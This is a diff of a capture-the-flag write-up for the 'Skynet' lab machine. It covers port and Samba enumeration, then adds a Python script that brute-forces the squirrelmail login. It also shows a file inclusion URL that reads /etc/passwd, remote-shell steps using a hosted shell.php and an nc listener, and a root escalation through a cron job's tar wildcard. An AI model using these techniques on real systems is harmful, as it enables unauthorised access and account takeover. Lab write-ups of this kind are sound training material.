@@ -8,7 +8,7 @@
 
 ## Enumeration
 
-- Nmap Initial
+### Nmap
 
 1. 22/ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 2. 80/http Apache httpd 2.4.18 ((Ubuntu))
@@ -18,6 +18,8 @@
 5. 143/imap Dovecot imapd
    - imap-capabilities: ENABLE LOGIN-REFERRALS Pre-login listed more IMAP4rev1 OK have LOGINDISABLEDA0001 ID IDLE post-login capabilities SASL-IR LITERAL+
 6. 445/tcp open netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+
+### Samba
 
 - samba enumeration with enum4linux
 
@@ -35,7 +37,14 @@ $ smbclient //$IP/anonymous
 ```
 
 - log1.txt -> may be passwords of something
-- attention.txt -> username - Miles Dyson
+- attention.txt -> 
+
+```
+A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
+-Miles Dyson
+```
+
+### HTTP
 
 - http directory enumeration
 
@@ -56,10 +65,33 @@ squirrelmail  [Status: 301, Size: 319, Words: 20, Lines: 10]
 
 - admin -> no permission
 
-- at this point, we get `username - Miles Dyson` and list of may be passwords from anonymous ftp server
+- at this point, we get `username - Miles Dyson` and list of may be passwords from smb
 - we know squirrel mail login page and try to brute force with Miles Dyson and passwords
 - create possible usernames
-- write in `mail_burte_force.py`
+- write as `mail_burte_force.py`
+
+```python
+import requests 
+
+with open('./from_ftp/log1.txt') as f:
+    pwds = f.readlines()
+
+usernames = ["Miles Dyson", "milesdyson", "m.dyson", "dysonmiles", "m-dyson"]
+s = requests.Session()
+
+for username in usernames:
+    for pwd in pwds:
+        pwd = pwd.strip()
+        data = {
+            "login_username": username,
+            "secretkey": pwd,
+            "js_autodetect_results": "1",
+            "just_logged_in": "1"
+        }
+        r = s.post('http://10.10.14.212/squirrelmail/src/redirect.php',
+                   data=data)
+        print(f"{username}:{pwd} -> {r.status_code}, {len(r.text)}")
+```
 
 `milesdyson:cyborg007haloterminator`
 
@@ -115,8 +147,13 @@ $ ffuf -u http://10.10.14.212/45kra24zxs28v3yd/FUZZ -w /usr/share/wordlists/comm
 - find cuppa exploit and found '/alertConfigField.php' Local/Remote File Inclusion
 - https://www.exploit-db.com/exploits/25971
 
+- check local file inclusion 
 - http://10.10.14.212/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../etc/passwd
 
+
+## User Access
+
+- it is said it also works for remote file inclusion
 - in local machine, create server with python and create shell.php file
 - listen with nc in local machine
 - curl request to
@@ -136,11 +173,7 @@ $ cat /home/milesdyson/user.txt
 
 ```sh
 $ cat /etc/crontab
-# /etc/crontab: system-wide crontab
-# Unlike any other crontab you don't have to run the `crontab'
-# command to install the new version when you edit this file
-# and files in /etc/cron.d. These files also have username fields,
-# that none of the other crontabs do.
+...
 
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
@@ -162,6 +195,8 @@ tar cf /home/milesdyson/backups/backup.tgz *
 - backup.sh is run by root user as cron job
 - backup.sh run tar with \* from /var/www/html directory which has `www-data` full permission
 - here is an exploit to get root shell
+
+## Root Access
 
 ```sh
 $ cd /var/www/html
